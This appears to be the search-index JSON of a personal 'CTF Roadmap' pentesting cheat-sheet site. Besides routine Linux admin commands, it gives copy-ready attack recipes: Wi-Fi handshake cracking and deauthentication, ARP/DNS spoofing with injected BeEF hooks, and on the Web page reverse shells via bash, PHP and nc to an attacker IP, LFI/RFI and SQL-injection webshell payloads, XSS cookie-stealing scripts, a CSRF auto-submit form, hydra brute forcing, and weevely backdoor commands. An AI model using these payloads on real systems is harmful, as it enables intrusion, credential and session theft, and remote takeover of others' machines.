{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to CTF Roadmap \ud83c\udff4\u200d\u2620\ufe0f This blog focuses on cybersecurity. It aims to walk you through the process of cyber defense and offensive pentesting. Keep it at hand in order to get the flag!","title":"Welcome to CTF Roadmap \ud83c\udff4\u200d\u2620\ufe0f"},{"location":"#welcome-to-ctf-roadmap","text":"This blog focuses on cybersecurity. It aims to walk you through the process of cyber defense and offensive pentesting. Keep it at hand in order to get the flag!","title":"Welcome to CTF Roadmap \ud83c\udff4\u200d\u2620\ufe0f"},{"location":"forensics/","text":"Digital Forensics TODO","title":"Forensics"},{"location":"forensics/#digital-forensics","text":"TODO","title":"Digital Forensics"},{"location":"linux/","text":"Linux Hacking System Boot # rescue / emergency modes on GRUB startup systemd.unit=rescue|emergency # get all services managed by systemd systemctl list-unit-files --type=service --all # get service config systemctl cat {service} # get service status systemctl status {service} # manage service state systemctl start|stop|restart|reload {service} systemctl enable|disable {service} # get last system logs journalctl -e # manage system state systemctl reboot|suspend|hibernate|poweroff # edit grub config nano /etc/default/grub update-grub Filesystem # get partitions sudo blkid sudo fdisk -l lsblk -f # get mounted partitions df -h # create a destination folder sudo mkdir -p /media/dst # mount a partition sudo mount /dev/sda2 /media/dst # mount in read only mode sudo mount -r /dev/sda2 /media/dst # mount a partition with a specified format sudo mount -t ext4|vfat|ntfs /dev/sda2 /media/dst # mount a disk image sudo mount -o loop ubuntu-cdrom.iso /media/dst # unmount a partition sudo umount /media/dst # get automated mounts cat /etc/fstab # format a partition sudo mkfs.vfat -n {label} /dev/sda2 Network Configuration # get info about network interfaces ip -br a # assign ip addr to interface ip a add {ip_addr/mask} dev {interface} # remove ip addr from interface ip a del {ip_addr} dev {interface} # change interface state ip link set dev {interface} up|down # get ARP cache ip n show # get routing table ip r # add a new route ip r add {net/mask} via {gateway_ip} ip r add default {net/mask} via {gateway_ip} # delete a route ip r del default # change MAC addr ip link set dev {interface} address {mac_addr} Compilation # get system version uname -a # prepare the compilation ./configure # compile the program make # install the program make install # clean the sources make clean make mrproper # uninstall program make uninstall Archiving & Compression # create a basic archive tar -cvf {archive.tar} {files} # extract from a basic archive tar -xvf {archive.tar} # create and compress a gzip archive tar -zcvf {archive.tar.gz} {files} # extract from a gzip archive tar -zxvf {archive.tar.gz} # create and compress a bzip2 archive tar -jcvf {archive.tar.bz2} {files} # extract from a bzip2 archive tar -jxvf {archive.tar.bz2} # create and compress a lzma archive tar -Jcvf {archive.tar.xz} {files} # extract from a lzma archive tar -Jxvf {archive.tar.xz} # create and compress a zip archive zip {archive.zip} {files} zip -r {archive.zip} {directory} # extract from a zip archive unzip {archive.zip} -d {directory} Users & Groups # get users list cat /etc/passwd | awk -F: '{print $ 1}' # get groups list cat /etc/group | awk -F: '{print $ 1}' # create a user sudo useradd {user} sudo passwd {user} # create a group sudo groupadd {group} # delete a user sudo userdel -r {user} # delete a group sudo groupdel {group} # add user to group sudo usermod -aG {group} {user} # remove user from group sudo gpasswd -d {user} {group} # change user default shell sudo usermod -s /bin/sh {user} # get user membership groups {user} id {user} Root Access # login with root account in the current directory su # login with root account in its home directory su - # run an action as root sudo {action} # get root actions allowed sudo -l # grant access to sudo visudo /etc/sudoers SSH (Secure Shell) # connection ssh {user}@{host} -p {port} SCP (Secure Copy) # copy local file to remote destination scp {src} {user}@{host}:{dst} # copy local directory to remote destination scp -r {src} {user}@{host}:{dst} # copy remote data to local destination scp {user}@{host}:{src} {dst} FTP (File Transfer Protocol) # connection ftp {host} # change user session > user # download a file > get {file} # upload a file > put {file}","title":"Linux"},{"location":"linux/#linux-hacking","text":"","title":"Linux Hacking"},{"location":"linux/#system-boot","text":"# rescue / emergency modes on GRUB startup systemd.unit=rescue|emergency # get all services managed by systemd systemctl list-unit-files --type=service --all # get service config systemctl cat {service} # get service status systemctl status {service} # manage service state systemctl start|stop|restart|reload {service} systemctl enable|disable {service} # get last system logs journalctl -e # manage system state systemctl reboot|suspend|hibernate|poweroff # edit grub config nano /etc/default/grub update-grub","title":"System Boot"},{"location":"linux/#filesystem","text":"# get partitions sudo blkid sudo fdisk -l lsblk -f # get mounted partitions df -h # create a destination folder sudo mkdir -p /media/dst # mount a partition sudo mount /dev/sda2 /media/dst # mount in read only mode sudo mount -r /dev/sda2 /media/dst # mount a partition with a specified format sudo mount -t ext4|vfat|ntfs /dev/sda2 /media/dst # mount a disk image sudo mount -o loop ubuntu-cdrom.iso /media/dst # unmount a partition sudo umount /media/dst # get automated mounts cat /etc/fstab # format a partition sudo mkfs.vfat -n {label} /dev/sda2","title":"Filesystem"},{"location":"linux/#network-configuration","text":"# get info about network interfaces ip -br a # assign ip addr to interface ip a add {ip_addr/mask} dev {interface} # remove ip addr from interface ip a del {ip_addr} dev {interface} # change interface state ip link set dev {interface} up|down # get ARP cache ip n show # get routing table ip r # add a new route ip r add {net/mask} via {gateway_ip} ip r add default {net/mask} via {gateway_ip} # delete a route ip r del default # change MAC addr ip link set dev {interface} address {mac_addr}","title":"Network Configuration"},{"location":"linux/#compilation","text":"# get system version uname -a # prepare the compilation ./configure # compile the program make # install the program make install # clean the sources make clean make mrproper # uninstall program make uninstall","title":"Compilation"},{"location":"linux/#archiving-compression","text":"# create a basic archive tar -cvf {archive.tar} {files} # extract from a basic archive tar -xvf {archive.tar} # create and compress a gzip archive tar -zcvf {archive.tar.gz} {files} # extract from a gzip archive tar -zxvf {archive.tar.gz} # create and compress a bzip2 archive tar -jcvf {archive.tar.bz2} {files} # extract from a bzip2 archive tar -jxvf {archive.tar.bz2} # create and compress a lzma archive tar -Jcvf {archive.tar.xz} {files} # extract from a lzma archive tar -Jxvf {archive.tar.xz} # create and compress a zip archive zip {archive.zip} {files} zip -r {archive.zip} {directory} # extract from a zip archive unzip {archive.zip} -d {directory}","title":"Archiving &amp; Compression"},{"location":"linux/#users-groups","text":"# get users list cat /etc/passwd | awk -F: '{print $ 1}' # get groups list cat /etc/group | awk -F: '{print $ 1}' # create a user sudo useradd {user} sudo passwd {user} # create a group sudo groupadd {group} # delete a user sudo userdel -r {user} # delete a group sudo groupdel {group} # add user to group sudo usermod -aG {group} {user} # remove user from group sudo gpasswd -d {user} {group} # change user default shell sudo usermod -s /bin/sh {user} # get user membership groups {user} id {user}","title":"Users &amp; Groups"},{"location":"linux/#root-access","text":"# login with root account in the current directory su # login with root account in its home directory su - # run an action as root sudo {action} # get root actions allowed sudo -l # grant access to sudo visudo /etc/sudoers","title":"Root Access"},{"location":"linux/#ssh-secure-shell","text":"# connection ssh {user}@{host} -p {port}","title":"SSH (Secure Shell)"},{"location":"linux/#scp-secure-copy","text":"# copy local file to remote destination scp {src} {user}@{host}:{dst} # copy local directory to remote destination scp -r {src} {user}@{host}:{dst} # copy remote data to local destination scp {user}@{host}:{src} {dst}","title":"SCP (Secure Copy)"},{"location":"linux/#ftp-file-transfer-protocol","text":"# connection ftp {host} # change user session > user # download a file > get {file} # upload a file > put {file}","title":"FTP (File Transfer Protocol)"},{"location":"networking/","text":"Network Hacking Information Gathering # alter mac address ifconfig IFACE down ifconfig IFACE hw ether MAC_ADDR ifconfig IFACE up # set up wifi interface to sniff packets ifconfig IFACE down airmon-ng check kill iwconfig IFACE mode monitor ifconfig IFACE up # discover wifi boxes airodump-ng IFACE # packet sniffing airodump-ng --bssid BSSID --channel CHANNEL --write sniff IFACE Exploitation Stage WEP Cracking # recover bssid password from sniff capture aircrack-ng sniff.cap WPA/WPA2 Cracking WPS Enabled # check for wifi boxes using WPS wash --interface IFACE # brute force WPS reaver --bssid BSSID --channel CHANNEL --interface IFACE -vvv --no-associate # associate with the WPS bssid aireplay-ng --fakeauth 30 -a BSSID -h MAC_ADDR IFACE WPS Disabled # handshake sniffing airodump-ng --bssid BSSID --channel CHANNEL --write handshake IFACE # disconnect a client from its bssid to force handshake to be resent aireplay-ng --deauth 5 -a BSSID -c CLIENT IFACE # crack the handshake using a wordlist aircrack-ng handshake.cap -w WORDLIST Post-Exploitation Stage MITM Basics # discover LAN neighbors netdiscover -r IP_RANGE # get more details about neighbors nmap ; zenmap # run a MITM attack echo 1 > /proc/sys/net/ipv4/ip_forward bettercap -iface IFACE > caplets.show > net.probe on > net.show > set arp.spoof.fullduplex true > set arp.spoof.targets CLIENT > arp.spoof on > set net.sniff.local true > set net.sniff.output sniff > net.sniff on > set dns.spoof.all true > set dns.spoof.domains example.com,*.example.com > dns.spoof on MITM & Code Injection /* first step is to create a JS script to be injected with MITM */ var imported = document.createElement(\"script\"); imported.src = \"http://HACKER_IP:3000/hook.js\" document.head.appendChild(imported); # second step is to add this payload script into hstshijack caplet set hstshijack.payloads *:/PATH_TO_JS_SCRIPT # third step is to run bettercap with hstshijack caplet bettercap -iface IFACE > hstshijack/hstshijack # fourth and last step is to run beef to hook the target browser beef-xss","title":"Networking"},{"location":"networking/#network-hacking","text":"","title":"Network Hacking"},{"location":"networking/#information-gathering","text":"# alter mac address ifconfig IFACE down ifconfig IFACE hw ether MAC_ADDR ifconfig IFACE up # set up wifi interface to sniff packets ifconfig IFACE down airmon-ng check kill iwconfig IFACE mode monitor ifconfig IFACE up # discover wifi boxes airodump-ng IFACE # packet sniffing airodump-ng --bssid BSSID --channel CHANNEL --write sniff IFACE","title":"Information Gathering"},{"location":"networking/#exploitation-stage","text":"","title":"Exploitation Stage"},{"location":"networking/#wep-cracking","text":"# recover bssid password from sniff capture aircrack-ng sniff.cap","title":"WEP Cracking"},{"location":"networking/#wpawpa2-cracking","text":"","title":"WPA/WPA2 Cracking"},{"location":"networking/#wps-enabled","text":"# check for wifi boxes using WPS wash --interface IFACE # brute force WPS reaver --bssid BSSID --channel CHANNEL --interface IFACE -vvv --no-associate # associate with the WPS bssid aireplay-ng --fakeauth 30 -a BSSID -h MAC_ADDR IFACE","title":"WPS Enabled"},{"location":"networking/#wps-disabled","text":"# handshake sniffing airodump-ng --bssid BSSID --channel CHANNEL --write handshake IFACE # disconnect a client from its bssid to force handshake to be resent aireplay-ng --deauth 5 -a BSSID -c CLIENT IFACE # crack the handshake using a wordlist aircrack-ng handshake.cap -w WORDLIST","title":"WPS Disabled"},{"location":"networking/#post-exploitation-stage","text":"","title":"Post-Exploitation Stage"},{"location":"networking/#mitm-basics","text":"# discover LAN neighbors netdiscover -r IP_RANGE # get more details about neighbors nmap ; zenmap # run a MITM attack echo 1 > /proc/sys/net/ipv4/ip_forward bettercap -iface IFACE > caplets.show > net.probe on > net.show > set arp.spoof.fullduplex true > set arp.spoof.targets CLIENT > arp.spoof on > set net.sniff.local true > set net.sniff.output sniff > net.sniff on > set dns.spoof.all true > set dns.spoof.domains example.com,*.example.com > dns.spoof on","title":"MITM Basics"},{"location":"networking/#mitm-code-injection","text":"/* first step is to create a JS script to be injected with MITM */ var imported = document.createElement(\"script\"); imported.src = \"http://HACKER_IP:3000/hook.js\" document.head.appendChild(imported); # second step is to add this payload script into hstshijack caplet set hstshijack.payloads *:/PATH_TO_JS_SCRIPT # third step is to run bettercap with hstshijack caplet bettercap -iface IFACE > hstshijack/hstshijack # fourth and last step is to run beef to hook the target browser beef-xss","title":"MITM &amp; Code Injection"},{"location":"profile/","text":"Author Pseudo : amorix ; Diploma : Cyber Defense Engineer - ENSIBS ; Platforms : Try Hack Me & Hack The Box . CTFs History Event Rank DG'hAck 2020 360/2069","title":"Author"},{"location":"profile/#author","text":"Pseudo : amorix ; Diploma : Cyber Defense Engineer - ENSIBS ; Platforms : Try Hack Me & Hack The Box .","title":"Author"},{"location":"profile/#ctfs-history","text":"Event Rank DG'hAck 2020 360/2069","title":"CTFs History"},{"location":"reversing/","text":"Reverse Engineering TODO","title":"Reversing"},{"location":"reversing/#reverse-engineering","text":"TODO","title":"Reverse Engineering"},{"location":"web/","text":"Web Hacking Information Gathering Whois Lookup ; Netcracft Site Report ; Robtex DNS Lookup ; Reverse DNS Lookup: Bing --> ip: {target_ip} ; Maltego. # subdomains discovery python knockpy.py {domain} # files and directories discovery dirb http://{domain} File Upload Vulnerabilities # create a reverse shell weevely generate {password} {rsh.php} # run reverse shell after upload weevely http://{rsh_location} {password} > help Bypass file upload filters using Burp: rsh.jpg --> upload --> rsh.php and rsh.jpg --> upload --> rsh.php.jpg . Code Execution Vulnerabilities # add some commands after the expected one {cmd} ; bash -i >& /dev/tcp/{atk_ip}/{atk_port} 0>&1 {cmd} && php -r '$sock=fsockopen(\"atk_ip\", atk_port); exec(\"/bin/sh -i <&3 >&3 2>&3\");'; {cmd} | nc -e /bin/sh {atk_ip} {atk_port} Local File Inclusion Vulnerabilities Exploit /proc/self/environ file: Burp --> Headers --> UA: <? passthru(\"nc -e /bin/sh {atk_ip} {atk_port}\"); ?> . Exploit /var/log/auth.log file: ssh \"<? passthru(base64_decode('{nc_cmd_base64_encoded}')); ?>\"@{target_ip} . Remote File Inclusion Vulnerabilities # create reverse shell echo '<?php passthru(\"nc -e /bin/sh {atk_ip} {atk_port}\"); ?>' > {rsh.txt} # include reverse shell from target curl http://{domain}/?page=http://{atk_ip}/{rsh.txt} # beautify a basic shell SHELL=/bin/sh script -q /dev/null SQL Injection Vulnerabilities Manual Approach # mysql basic connection mysql -u {user} -h {host} -p > show databases; > use {db}; > show tables; # search for injection INPUT=\"blabla' ORDER BY 1000 %23\" # general login bypass INPUT=\"blabla' %23\" INPUT=\"blabla' OR 1=1 %23\" # try to get the columns number fetched INPUT=\"blabla' ORDER BY {x} %23\" # get displayed columns number INPUT=\"blabla' UNION SELECT 1,2,3,...{x} %23\" # get basic database info INPUT=\"blabla' UNION SELECT database(),version(),user(),...{x} %23\" # get tables names INPUT=\"blabla' UNION SELECT table_name,null,null,...{x} FROM information_schema.tables WHERE table_schema = {db} %23\" # get table columns INPUT=\"blabla' UNION SELECT column_name,null,null,...{x} %23 FROM information_schema.columns WHERE table_name = {table} %23\" # display a sepcific record from list whereas only one is expected INPUT=\"blabla' UNION ... LIMIT {row_number},1 %23\" # bypass keyword filters INPUT=\"blabla' uNiOn sElEcT ... %23\" INPUT=\"blabla' uNiOn+sElEcT+... %23\" INPUT=\"blabla' uNiOn/**/sElEcT/**/... %23\" # read file from SQL INPUT=\"blabla' UNION SELECT null, load_file('{file}') %23\" # write file from SQL INPUT=\"blabla' UNION SELECT null, '<?php passthru(\"nc -e /bin/sh {atk_ip} {atk_port}\"); ?>' INTO OUTFILE '{/tmp/rsh.php}' %23\" Automated Approach # get db names sqlmap -u \"{url_with_params}\" --dbs # get current user sqlmap -u \"{url_with_params}\" --current-user # get tables from database sqlmap -u \"{url_with_params}\" --tables -D {db} # get columns from table sqlmap -u \"{url_with_params}\" --columns -T {table} -D {db} # dump table data sqlmap -u \"{url_with_params}\" --dump -T {table} -D {db} # get an os shell sqlmap -u \"{url_with_params}\" --os-shell # get an sql shell sqlmap -u \"{url_with_params}\" --sql-shell XSS Vulnerabilities <!-- search for XSS --> <script>alert(1);</script> <!-- create an HTML cookie catcher --> <svg onload=\"document.body.innerHTML=document.body.innerHTML.concat('<img src=\\'{catcher_site}'.concat(btoa(document.cookie)).concat('\\' />'))\" /> <!-- create a JS cookie catcher --> <script> var payload = \"var request = new XMLHttpRequest(); request.onreadystatechange = function () { var DONE = this.DONE || 4; if (this.readyState === DONE){ var encoded = btoa(request.responseText); document.location = '{catcher_site}?' + encoded; } }; request.open('GET', '/', true); request.send(null);\"; </script> <svg onload=\"eval(atob('{base64_encoded_payload}'))\" /> <!-- create an XSS reverse shell --> <img src=http://{atk_ip}/$(nc.traditional$IFS-e$IFS/bin/sh$IFS'{atk_ip}'$IFS'{atk_port}')> <!-- hook target using BEEF --> <script src=\"http://{atk_ip}:3000/hook.js\"></script> BEEF exploit --> Commands: Spyder Eye Screenshots ; Alert Dialog ; Social Network Pretty Theft ; Fake Notification Bar. CSRF Vulnerabilities <!-- create an hidden form to be submitted by the target --> <form id=\"csrf-form\" action=\"http://{full_path_to_form}\" method=\"post\" hidden> <input name=\"{blabla}\" value=\"{blabla}\"> </form> <script>document.getElementById(\"csrf-form\").submit();</script> <!-- create a link that redirect to a website hosting the csrf form --> <a href=\"https://{atk}.tiiny.site\"></a> Brute Force & Dictionnary Attack # create a wordlist crunch {min} {max} {symbols} -t {pattern} -o {outfile} # crack a post login form using the wordlist hydra {target_ip} -l {user} -P {wordlist} http-post-form \"/{path_to_login_form}:{user}=^USER^&{password}=^PASS^:F={fail_login_msg}\" Post Exploitation # escalate from basic reverse shell to weevely atk > weevely generate {passwd} {rsh.txt} target> wget http://{atk_ip}/{rsh.txt} > mv {rsh.txt} {rsh.php} atk > weevely http://{target_ip}/{rsh.php} {passwd} # advanced weevely usage > help > system-info > shell-sh -vector {vect} {cmd} > file_read -vector {vect} {file} > file_download -vector {vect} {remote_path} {local_path} > file_upload -vector {vect} {local_path} ./{remote_path} > backdoor_reversetcp -vector {vect} {atk_ip} {atk_port} > sql_dump -vector {vect} -host localhost -lpath {local_path} {db} {user} {passwd}","title":"Web"},{"location":"web/#web-hacking","text":"","title":"Web Hacking"},{"location":"web/#information-gathering","text":"Whois Lookup ; Netcracft Site Report ; Robtex DNS Lookup ; Reverse DNS Lookup: Bing --> ip: {target_ip} ; Maltego. # subdomains discovery python knockpy.py {domain} # files and directories discovery dirb http://{domain}","title":"Information Gathering"},{"location":"web/#file-upload-vulnerabilities","text":"# create a reverse shell weevely generate {password} {rsh.php} # run reverse shell after upload weevely http://{rsh_location} {password} > help Bypass file upload filters using Burp: rsh.jpg --> upload --> rsh.php and rsh.jpg --> upload --> rsh.php.jpg .","title":"File Upload Vulnerabilities"},{"location":"web/#code-execution-vulnerabilities","text":"# add some commands after the expected one {cmd} ; bash -i >& /dev/tcp/{atk_ip}/{atk_port} 0>&1 {cmd} && php -r '$sock=fsockopen(\"atk_ip\", atk_port); exec(\"/bin/sh -i <&3 >&3 2>&3\");'; {cmd} | nc -e /bin/sh {atk_ip} {atk_port}","title":"Code Execution Vulnerabilities"},{"location":"web/#local-file-inclusion-vulnerabilities","text":"Exploit /proc/self/environ file: Burp --> Headers --> UA: <? passthru(\"nc -e /bin/sh {atk_ip} {atk_port}\"); ?> . Exploit /var/log/auth.log file: ssh \"<? passthru(base64_decode('{nc_cmd_base64_encoded}')); ?>\"@{target_ip} .","title":"Local File Inclusion Vulnerabilities"},{"location":"web/#remote-file-inclusion-vulnerabilities","text":"# create reverse shell echo '<?php passthru(\"nc -e /bin/sh {atk_ip} {atk_port}\"); ?>' > {rsh.txt} # include reverse shell from target curl http://{domain}/?page=http://{atk_ip}/{rsh.txt} # beautify a basic shell SHELL=/bin/sh script -q /dev/null","title":"Remote File Inclusion Vulnerabilities"},{"location":"web/#sql-injection-vulnerabilities","text":"","title":"SQL Injection Vulnerabilities"},{"location":"web/#manual-approach","text":"# mysql basic connection mysql -u {user} -h {host} -p > show databases; > use {db}; > show tables; # search for injection INPUT=\"blabla' ORDER BY 1000 %23\" # general login bypass INPUT=\"blabla' %23\" INPUT=\"blabla' OR 1=1 %23\" # try to get the columns number fetched INPUT=\"blabla' ORDER BY {x} %23\" # get displayed columns number INPUT=\"blabla' UNION SELECT 1,2,3,...{x} %23\" # get basic database info INPUT=\"blabla' UNION SELECT database(),version(),user(),...{x} %23\" # get tables names INPUT=\"blabla' UNION SELECT table_name,null,null,...{x} FROM information_schema.tables WHERE table_schema = {db} %23\" # get table columns INPUT=\"blabla' UNION SELECT column_name,null,null,...{x} %23 FROM information_schema.columns WHERE table_name = {table} %23\" # display a sepcific record from list whereas only one is expected INPUT=\"blabla' UNION ... LIMIT {row_number},1 %23\" # bypass keyword filters INPUT=\"blabla' uNiOn sElEcT ... %23\" INPUT=\"blabla' uNiOn+sElEcT+... %23\" INPUT=\"blabla' uNiOn/**/sElEcT/**/... %23\" # read file from SQL INPUT=\"blabla' UNION SELECT null, load_file('{file}') %23\" # write file from SQL INPUT=\"blabla' UNION SELECT null, '<?php passthru(\"nc -e /bin/sh {atk_ip} {atk_port}\"); ?>' INTO OUTFILE '{/tmp/rsh.php}' %23\"","title":"Manual Approach"},{"location":"web/#automated-approach","text":"# get db names sqlmap -u \"{url_with_params}\" --dbs # get current user sqlmap -u \"{url_with_params}\" --current-user # get tables from database sqlmap -u \"{url_with_params}\" --tables -D {db} # get columns from table sqlmap -u \"{url_with_params}\" --columns -T {table} -D {db} # dump table data sqlmap -u \"{url_with_params}\" --dump -T {table} -D {db} # get an os shell sqlmap -u \"{url_with_params}\" --os-shell # get an sql shell sqlmap -u \"{url_with_params}\" --sql-shell","title":"Automated Approach"},{"location":"web/#xss-vulnerabilities","text":"<!-- search for XSS --> <script>alert(1);</script> <!-- create an HTML cookie catcher --> <svg onload=\"document.body.innerHTML=document.body.innerHTML.concat('<img src=\\'{catcher_site}'.concat(btoa(document.cookie)).concat('\\' />'))\" /> <!-- create a JS cookie catcher --> <script> var payload = \"var request = new XMLHttpRequest(); request.onreadystatechange = function () { var DONE = this.DONE || 4; if (this.readyState === DONE){ var encoded = btoa(request.responseText); document.location = '{catcher_site}?' + encoded; } }; request.open('GET', '/', true); request.send(null);\"; </script> <svg onload=\"eval(atob('{base64_encoded_payload}'))\" /> <!-- create an XSS reverse shell --> <img src=http://{atk_ip}/$(nc.traditional$IFS-e$IFS/bin/sh$IFS'{atk_ip}'$IFS'{atk_port}')> <!-- hook target using BEEF --> <script src=\"http://{atk_ip}:3000/hook.js\"></script> BEEF exploit --> Commands: Spyder Eye Screenshots ; Alert Dialog ; Social Network Pretty Theft ; Fake Notification Bar.","title":"XSS Vulnerabilities"},{"location":"web/#csrf-vulnerabilities","text":"<!-- create an hidden form to be submitted by the target --> <form id=\"csrf-form\" action=\"http://{full_path_to_form}\" method=\"post\" hidden> <input name=\"{blabla}\" value=\"{blabla}\"> </form> <script>document.getElementById(\"csrf-form\").submit();</script> <!-- create a link that redirect to a website hosting the csrf form --> <a href=\"https://{atk}.tiiny.site\"></a>","title":"CSRF Vulnerabilities"},{"location":"web/#brute-force-dictionnary-attack","text":"# create a wordlist crunch {min} {max} {symbols} -t {pattern} -o {outfile} # crack a post login form using the wordlist hydra {target_ip} -l {user} -P {wordlist} http-post-form \"/{path_to_login_form}:{user}=^USER^&{password}=^PASS^:F={fail_login_msg}\"","title":"Brute Force &amp; Dictionnary Attack"},{"location":"web/#post-exploitation","text":"# escalate from basic reverse shell to weevely atk > weevely generate {passwd} {rsh.txt} target> wget http://{atk_ip}/{rsh.txt} > mv {rsh.txt} {rsh.php} atk > weevely http://{target_ip}/{rsh.php} {passwd} # advanced weevely usage > help > system-info > shell-sh -vector {vect} {cmd} > file_read -vector {vect} {file} > file_download -vector {vect} {remote_path} {local_path} > file_upload -vector {vect} {local_path} ./{remote_path} > backdoor_reversetcp -vector {vect} {atk_ip} {atk_port} > sql_dump -vector {vect} -host localhost -lpath {local_path} {db} {user} {passwd}","title":"Post Exploitation"},{"location":"windows/","text":"Windows Hacking TODO","title":"Windows"},{"location":"windows/#windows-hacking","text":"TODO","title":"Windows Hacking"}]}